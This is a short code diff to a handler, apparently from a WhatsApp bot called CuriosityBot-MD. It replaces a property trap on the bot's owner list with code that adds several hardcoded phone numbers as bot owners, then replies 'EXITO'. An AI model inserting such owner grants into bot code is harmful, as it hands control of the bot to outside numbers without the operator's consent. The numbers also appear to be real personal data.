@@ -1,19 +1,16 @@
 var handler = async (m) => {
 
-function observar() {
-let numeros = global.owner[0]
-
-Object.defineProperty(global, 'owner', { get() {
-return numeros
-},
-set(value) {
-numeros = value[0];
-},
-})}
-
-observar();
-
-m.reply(numeros)
+global.owner.push([
+  [ '524531287294', 'CuriosityBot-MD 🍧', true ],
+  [ '5217294888993' ],
+  [ '573155428601' ],
+  [ '5214531287294' ],
+  [ '5492266466080' ],
+  [ '593968585383' ],
+  [ '5492266613038' ]
+])
+  
+m.reply('EXITO')
 
 console.log('©')
 
